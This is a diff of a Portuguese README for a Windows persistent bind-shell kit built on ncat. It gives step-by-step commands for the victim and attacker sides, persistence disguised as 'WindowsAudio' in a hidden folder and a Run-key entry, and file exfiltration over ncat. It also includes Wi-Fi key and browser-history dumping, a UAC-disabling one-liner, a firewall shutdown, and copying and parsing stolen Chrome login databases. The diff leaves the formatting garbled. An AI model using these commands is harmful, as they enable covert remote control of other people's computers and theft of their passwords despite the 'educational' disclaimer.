@@ -1,4 +1,4 @@
-# ncat_shell_win
+# 🖥️ ncat_shell_win - Bind Shell Persistente no Windows
 
 ⚠️ **Aviso**
 Este projeto é apenas para **fins educacionais e testes autorizados**. O uso indevido é de total responsabilidade do usuário.
@@ -7,17 +7,32 @@ Bind Shell persistente no Windows via NCAT (Nmap).
 
 ---
 
+## 📑 Sumário
+
+- [Requisitos](#-requisitos)
+- [O que o Install_Full.bat faz](#-o-que-o-install_full.bat-faz)
+- [Como usar](#-como-usar)
+- [Verificar persistência](#-verificar-persistência)
+- [Remoção completa](#-remoção-completa)
+- [Transferir arquivos](#-transferir-arquivos)
+- [Comandos úteis](#-comandos-úteis-pós-conexão)
+- [Elevação de privilégio](#-elevação-de-privilégio-desabilitar-uac)
+- [Extrair senhas do Chrome](#-extrair-senhas-salvas-do-chrome)
+
+---
+
 ## 📋 Requisitos
 
 - Windows 10/11
-- Conexão com internet para baixar o WinGet e instalar o Nmap (Se Necessário)
+- Conexão com internet para baixar o WinGet e instalar o Nmap (se necessário)
+
 ---
 
 ## 🚀 O que o Install_Full.bat faz
 
 | Etapa | Descrição |
 |-------|-----------|
-| 0 | Instalar o **WinGet** via curl
+| 0 | Instala o **WinGet** via curl |
 | 1 | Instala o **Nmap** silenciosamente via `winget` (contém o `ncat`) |
 | 2 | Cria pasta oculta `C:\Users\Usuario\WindowsAudio\` (atributo +h) |
 | 3 | Cria `audio.vbs` - Loop infinito com ncat invisível na porta **5575** |
@@ -30,77 +45,52 @@ Bind Shell persistente no Windows via NCAT (Nmap).
 ## ▶️ Como usar
 
 ### 1. Na vítima (Windows)
-- `Install_Full.bat` Windows 10 recem instalado, somente com Windows Defender padrão (Shell Persistente)
+
+- **`Install_Full.bat`** - Windows 10 recém instalado, somente com Windows Defender padrão (Shell Persistente)
   
-- `Install_Nmap.bat` Windows 10/11 já com winget, sem nmap, somente com Windows Defender padrão (Shell Persistente)
+- **`Install_Nmap.bat`** - Windows 10/11 já com winget, sem nmap, somente com Windows Defender padrão (Shell Persistente)
   
-- `Install_Shell.bat` Windows 10/11 já com winget sem nmap, pode ter antivirus instalado, não detecta.
-OBS: (Assim que executado o `Install_Shell.bat` e ganhar a shell, é recomendado imediatamente copiar e colar todo script do `Persistência.txt` para ter shell persistente.
+- **`Install_Shell.bat`** - Windows 10/11 já com winget sem nmap, pode ter antivírus instalado, não detecta.
+  - **OBS:** Assim que executado o `Install_Shell.bat` e ganhar a shell, é recomendado imediatamente copiar e colar todo script do `Persistência.txt` para ter shell persistente.
 
 ### 2. No atacante
+
 ```bash
 # Windows (via ncat)
 ncat IP_DA_VITIMA 5575
 
 # Linux (via nc)
 nc IP_DA_VITIMA 5575
-```
 
----
-
-## 🔍 Verificar persistência
-
-```cmd
+🔍 Verificar persistência
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio"
-```
 
----
-
-## 🗑️ Remoção completa
-
-```cmd
+🗑️ Remoção completa
 taskkill /f /im ncat.exe
 taskkill /f /im wscript.exe
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /f
 rmdir /s /q "%USERPROFILE%\WindowsAudio"
-```
 
----
-
-## 📡 Transferir arquivos
-
-### Enviar arquivo do Linux para o Windows
-
-**No shell Windows conectado:**
-```cmd
+📡 Transferir arquivos
+Enviar arquivo do Linux para o Windows
+No shell Windows conectado:
 ncat -lnp 5581 > "C:\Users\Usuario\Desktop\arquivo.jpg"
-```
 
-**No Linux (outro terminal):**
-```bash
+No Linux (outro terminal):
 ncat IP_DA_VITIMA 5581 < /caminho/do/arquivo.jpg
-```
 
----
-
-## 🔑 Comandos úteis pós-conexão
-
-```cmd
+🔑 Comandos úteis pós-conexão
 whoami                                         # Ver usuário atual
 whoami /groups                                 # Ver grupos/privilégios
 tasklist                                       # Listar processos
 netstat -ano                                   # Conexões de rede
 shutdown /r /t 0                               # Reiniciar
-```
-
-### Redes Wi-Fi
-```cmd
+Redes Wi-Fi
+cmd
 netsh wlan show profiles                       # Redes salvas
 netsh wlan show profile name="REDE" key=clear  # Senha do Wi-Fi
-```
-
-### Histórico do navegador
-```cmd
+Histórico do navegador
+cmd
 # Chrome
 findstr /i "http" "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History"
 
@@ -109,52 +99,77 @@ findstr /i "http" "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History"
 
 # Firefox
 findstr /i "http" "%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
-```
+🔓 Elevação de Privilégio (Desabilitar UAC)
+⚠️ Aviso: Técnica requer interação do usuário. Use apenas em testes autorizados.
 
----
+Atenção: Esta técnica requer interação do usuário (pop-up UAC) e reinicialização do sistema.
 
-## 🔐 Extrair senhas salvas do Chrome
+powershell
+# Desabilita o UAC e reinicia o sistema imediatamente:
+powershell -Command "Start-Process cmd -ArgumentList '/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && shutdown /r /t 0' -Verb RunAs"
+O que acontece:
 
-### 1. Copiar arquivos no Windows (shell conectado)
-```cmd
+Abre um pop-up do UAC solicitando permissão administrativa
+
+Se o usuário clicar em "Sim", desabilita o UAC no registro
+
+Reinicia o sistema automaticamente
+
+Após o reboot, qualquer shell terá privilégios administrativos totais
+
+Para reabilitar o UAC:
+powershell
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f && shutdown /r /t 0
+Desabilitar firewall:
+cmd
+# Desabilita o firewall para todos os perfis (Domínio, Privado, Público)
+netsh advfirewall set allprofiles state off
+
+# Para reabilitar o firewall:
+netsh advfirewall set allprofiles state on
+
+# Verificar status do firewall:
+netsh advfirewall show allprofiles
+Verificar se tem privilégios administrativos:
+cmd
+whoami /groups | findstr "Administradores"
+Interpretação da saída:
+
+Se aparecer Grupo usado apenas para negar → UAC ativo (admin filtrado)
+
+Se aparecer Grupo obrigatório, Ativado por padrão, Grupo ativado, Proprietário do grupo → Admin completo (UAC desabilitado)
+
+🔐 Extrair senhas salvas do Chrome
+1. Copiar arquivos no Windows (shell conectado)
+cmd
 copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%USERPROFILE%\WindowsAudio\LoginData.db"
 copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State" "%USERPROFILE%\WindowsAudio\LocalState.json"
-```
+2. Transferir para o atacante
+No Windows (shell conectado):
 
-### 2. Transferir para o atacante
-
-**No Windows (shell conectado):**
-```cmd
+cmd
 ncat -lnp 5581 < "%USERPROFILE%\WindowsAudio\LoginData.db"
-```
+No Linux (outro terminal):
 
-**No Linux (outro terminal):**
-```bash
+bash
 ncat IP_DA_VITIMA 5581 > LoginData.db
-```
+Repita para o LocalState (use porta 5582):
 
-**Repita para o LocalState (use porta 5582):**
+No Windows:
 
-**No Windows:**
-```cmd
+cmd
 ncat -lnp 5582 < "%USERPROFILE%\WindowsAudio\LocalState.json"
-```
+No Linux:
 
-**No Linux:**
-```bash
+bash
 ncat IP_DA_VITIMA 5582 > LocalState.json
-```
-
-### 3. Instalar dependência no Linux
-```bash
+3. Instalar dependência no Linux
+bash
 pip install pycryptodomex --break-system-packages
-```
+4. Script Python para extrair senhas
+Crie o arquivo decode_users_pass.py:
 
-### 4. Script Python para extrair senhas
-
-Crie o arquivo `decode_users_pass.py`:
-
-```python
+python
 import sqlite3
 import json
 import base64
@@ -192,42 +207,19 @@ for url, user, pwd in cursor.fetchall():
 
 conn.close()
 print("\n[!] Senhas estão criptografadas. A descriptografia completa precisa ser feita no Windows.")
-```
-
-Execute:
-```bash
+5. Executar o script:
+bash
 python3 decode_users_pass.py
-```
+📝 Notas finais
+Todos os scripts e bat files devem estar no mesmo diretório
 
-### 5. Elevação de Privilégio (Desabilitar UAC)
+A porta padrão é 5575 - pode ser alterada nos arquivos .bat e .vbs
 
-⚠️ **Aviso** O uso indevido é de total responsabilidade do usuário.
+Para testes em rede local, certifique-se que o firewall da máquina alvo permite conexões de entrada na porta utilizada
 
-**Atenção:** Esta técnica requer interação do usuário (pop-up UAC) e reinicialização do sistema.
+Sempre reabilite o UAC e o firewall após os testes
 
-```powershell
-# Desabilita o UAC e reinicia o sistema imediatamente:
-powershell -Command "Start-Process cmd -ArgumentList '/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && shutdown /r /t 0' -Verb RunAs"
+⚖️ Responsabilidade Legal
+Este material é fornecido exclusivamente para fins educacionais. O autor não se responsabiliza por qualquer uso malicioso ou ilegal das técnicas descritas. Sempre obtenha autorização explícita antes de testar em qualquer sistema que não seja de sua propriedade.
 
-O que acontece:
-Abre um pop-up do UAC solicitando permissão administrativa
-Se o usuário clicar em "Sim", desabilita o UAC no registro
-Reinicia o sistema automaticamente na hora
-Após o reboot, qualquer shell terá privilégios administrativos totais
-
-# Para reabilitar o UAC:
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f && shutdown /r /t 0
-
-# Desabilita o firewall para todos os perfis (Domínio, Privado, Público)
-netsh advfirewall set allprofiles state off
-
-# Para reabilitar firewall:
-netsh advfirewall set allprofiles state on
-
-# Verificar status do firewall:
-netsh advfirewall show allprofiles
-
-# Verificar se tem privilégios administrativos
-whoami /groups | findstr "Administradores"
-# Se aparecer "BUILTIN\Administradores - Grupo obrigatório, Ativado por padrão, Grupo ativado, Proprietário do grupo"
-# indica Admin completo (UAC desabilitado).
+text
